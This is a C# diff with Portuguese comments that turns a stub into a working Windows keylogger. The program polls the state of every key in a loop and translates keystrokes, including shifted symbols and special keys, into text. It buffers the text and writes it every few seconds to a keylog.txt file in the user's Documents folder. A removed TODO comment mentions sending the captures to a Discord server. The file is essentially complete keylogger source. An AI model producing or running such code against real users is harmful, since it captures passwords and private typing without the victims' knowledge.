@@ -1,73 +1,258 @@
-﻿using System.Threading.Tasks;
+﻿using System.Text;
 
 namespace CastApp
 {
     public class Program
     {
-        private static void Main(string[] args)
+        /// <summary>
+        /// Pasta e arquivo de log
+        /// </summary>
+        private static readonly string LogDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "KeyLogger");
+        private static readonly string LogFile = Path.Combine(LogDirectory, "keylog.txt");
+
+        /// <summary>
+        /// Lock para escrita no arquivo para evitar condições de corrida em ambientes multithread
+        /// Basicamente trava o acesso ao arquivo para que apenas uma thread possa escrever nele de cada vez
+        /// </summary>
+        private static readonly object FileLock = new object();
+
+        /// <sumary>
+        /// Buffer para armazenar teclas antes de escrever no arquivo
+        /// Assim, evitamos múltiplas escritas pequenas e melhoramos a performance
+        /// buffer basicamente e uma area de memoria temporaria onde guardamos os dados antes de os processar ou guardar em algum sitio
+        /// </sumary>
+        private static readonly StringBuilder KeyBuffer = new StringBuilder();
+        private static DateTime lastFlush = DateTime.Now;
+        private static readonly TimeSpan FlushInterval = TimeSpan.FromSeconds(5);
+
+        /// <summary>
+        /// Ponmto de entrada do programa
+        /// Onde tudo começa
+        /// <summary>
+        private static void Main()
         {
-            //Todo
-            // Criar uma especi de lopp para o programa onde captura as teclas e depois gravara num ficheiro ou poderiamos mandar para um server de discord
-            // Tmb ter em atencao tornar o codigo legivel e sempre que possivel comentar para que os outros possam entender e trabalhar em conjunto
-            // criei uma class chamada Natives para ser usada ja tem mais comentarios para vcs 
-            Start();
+            try
+            { 
+                InitializeLogFile();
+                StartKeyCapture();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Erro fatal: {ex.Message}");
+                Console.ReadKey();
+            }
         }
 
-        protected static void Start()
+        /// <summary>
+        /// Inicializa o arquivo de log
+        /// </summary>
+        private static void InitializeLogFile()
+        {
+            try
+            {
+                if (!Directory.Exists(LogDirectory))
+                {
+                    Directory.CreateDirectory(LogDirectory);
+                }
+
+                if (!File.Exists(LogFile))
+                {
+                    using (var sw = File.CreateText(LogFile))
+                    {
+                        sw.WriteLine($"=== KeyLogger iniciado em {DateTime.Now:yyyy-MM-dd HH:mm:ss} ===");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException($"Não foi possível inicializar o arquivo de log: {ex.Message}");
+            }
+        }
+
+        /// <summary>
+        /// Loop principal de captura de teclas
+        /// </summary>
+        private static void StartKeyCapture()
         {
             while (true)
             {
-                bool shift = (Natives.GetAsyncKeyState(160) & 0x8000) != 0 || (Natives.GetAsyncKeyState(161) & 0x8000) != 0;
-                var capsLock = Console.CapsLock;
-
-                for (int i = 0; i < 255; i++)
+                try
                 {
-                    short state = (short)Natives.GetAsyncKeyState(i);
-                    if (state == 1 || state == -32767)
+                    if (DateTime.Now - lastFlush > FlushInterval)
                     {
-                        char c = GetCharFromKey(i, shift, capsLock);
-                        Console.Write(c);
+                        FlushBuffer();
                     }
+
+                    bool leftShift = (Natives.GetAsyncKeyState(160) & 0x8000) != 0;
+                    bool rightShift = (Natives.GetAsyncKeyState(161) & 0x8000) != 0;
+                    bool shift = leftShift || rightShift;
+                    bool capsLock = Console.CapsLock;
+
+                    for (int vkCode = 0; vkCode < 256; vkCode++)
+                    {
+                        short keyState = (short)Natives.GetAsyncKeyState(vkCode);
+
+                        if (keyState == 1 || keyState == -32767)
+                        {
+                            ProcessKey(vkCode, shift, capsLock);
+                        }
+                    }
+
+                    Thread.Sleep(1);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Erro no loop principal: {ex.Message}");
+                    Thread.Sleep(100);
                 }
             }
         }
 
-        protected static char GetCharFromKey(int vkCode, bool shift, bool capsLock)
+        /// <summary>
+        /// Processa uma tecla pressionada
+        /// </summary>
+        private static void ProcessKey(int vkCode, bool shift, bool capsLock)
         {
-            switch (vkCode)
+            try
             {
-                case 8:
-                    Console.Write("\b \b");
-                    return '\0';
+                var keyInfo = GetKeyInfo(vkCode, shift, capsLock);
 
-                case 13:
-                    return '\n';
+                if (!string.IsNullOrEmpty(keyInfo))
+                {
+                    lock (KeyBuffer)
+                    {
+                        KeyBuffer.Append(keyInfo);
+                    }
 
-                case 9:
-                    return '\t';
-
-                case 32:
-                    return ' ';
-
-                case >= 65 and <= 90:
-                    char c = (char)vkCode;
-                    return (capsLock ^ shift) ? char.ToUpper(c) : char.ToLower(c);
-
-                case 48: return shift ? ')' : '0';
-                case 49: return shift ? '!' : '1';
-                case 50: return shift ? '@' : '2';
-                case 51: return shift ? '#' : '3';
-                case 52: return shift ? '$' : '4';
-                case 53: return shift ? '%' : '5';
-                case 54: return shift ? '^' : '6';
-                case 55: return shift ? '&' : '7';
-                case 56: return shift ? '*' : '8';
-                case 57: return shift ? '(' : '9';
-
-                default:
-                    return '\0';
+                    Console.Write(keyInfo);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Erro ao processar tecla {vkCode}: {ex.Message}");
             }
         }
 
+        /// <summary>
+        /// Converte código de tecla virtual para caractere/string
+        /// Faz o mapeamento das teclas considerando Shift e CapsLock
+        /// e retorna a representação correta
+        /// Basicamnete faz o mesmo que a funcao TeclaPrecionada do natives mas de uma forma mais eficiente
+        /// </summary>
+        private static string GetKeyInfo(int vkCode, bool shift, bool capsLock)
+        {
+            return vkCode switch
+            {
+                // Teclas especiais
+                8 => "[BACKSPACE]", // Backspace
+                9 => "\t",           // Tab
+                13 => "\r\n",        // Enter
+                27 => "[ESC]",       // Escape
+                32 => " ",           // Espaço
+
+                // Teclas de função
+                >= 112 and <= 123 => $"[F{vkCode - 111}]", // F1-F12
+
+                // Setas
+                37 => "[←]", // Esquerda
+                38 => "[↑]", // Cima
+                39 => "[→]", // Direita
+                40 => "[↓]", // Baixo
+
+                // Letras A-Z
+                >= 65 and <= 90 => ProcessLetter((char)vkCode, shift, capsLock),
+
+                // Números e símbolos
+                >= 48 and <= 57 => ProcessNumber(vkCode, shift),
+
+                // Numpad
+                >= 96 and <= 105 => ((char)(vkCode - 48)).ToString(), // Numpad 0-9
+
+                // Pontuação comum
+                186 => shift ? ":" : ";",    // ;:
+                187 => shift ? "+" : "=",    // =+
+                188 => shift ? "<" : ",",    // ,<
+                189 => shift ? "_" : "-",    // -_
+                190 => shift ? ">" : ".",    // .>
+                191 => shift ? "?" : "/",    // /?
+                192 => shift ? "~" : "`",    // `~
+                219 => shift ? "{" : "[",    // [{
+                220 => shift ? "|" : "\\",   // \|
+                221 => shift ? "}" : "]",    // ]}
+                222 => shift ? "\"" : "'",   // '"
+
+                // Outras teclas especiais
+                16 => "[SHIFT]",
+                17 => "[CTRL]",
+                18 => "[ALT]",
+                20 => "[CAPS]",
+                144 => "[NUMLOCK]",
+                145 => "[SCROLL]",
+
+                _ => null! // Tecla não mapeada
+            };
+        }
+
+        /// <summary>
+        /// Processa letras considerando Shift e CapsLock
+        /// Basicamente verifica se a letra deve ser maiúscula ou minúscula
+        /// </summary>
+        private static string ProcessLetter(char letter, bool shift, bool capsLock)
+        {
+            // XOR entre shift e capslock determina se a letra deve ser maiúscula
+            bool shouldBeUpper = shift ^ capsLock;
+            return shouldBeUpper ? letter.ToString() : char.ToLower(letter).ToString();
+        }
+
+        /// <summary>
+        /// Processa números e seus símbolos correspondentes
+        /// </summary>
+        private static string ProcessNumber(int vkCode, bool shift)
+        {
+            return vkCode switch
+            {
+                48 => shift ? ")" : "0",
+                49 => shift ? "!" : "1",
+                50 => shift ? "@" : "2",
+                51 => shift ? "#" : "3",
+                52 => shift ? "$" : "4",
+                53 => shift ? "%" : "5",
+                54 => shift ? "^" : "6",
+                55 => shift ? "&" : "7",
+                56 => shift ? "*" : "8",
+                57 => shift ? "(" : "9",
+                _ => null!
+            };
+        }
+
+        /// <summary>
+        /// Escreve o buffer no arquivo de log
+        /// Serve para pegar todas as teclas que estao no buffer e escreve no arquivo de log
+        /// </summary>
+        private static void FlushBuffer()
+        {
+            try
+            {
+                string content;
+                lock (KeyBuffer)
+                {
+                    if (KeyBuffer.Length == 0) return;
+
+                    content = KeyBuffer.ToString();
+                    KeyBuffer.Clear();
+                }
+
+                lock (FileLock)
+                {
+                    File.AppendAllText(LogFile, content, Encoding.UTF8);
+                }
+
+                lastFlush = DateTime.Now;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Erro ao escrever no arquivo: {ex.Message}");
+            }
+        }
     }
 }
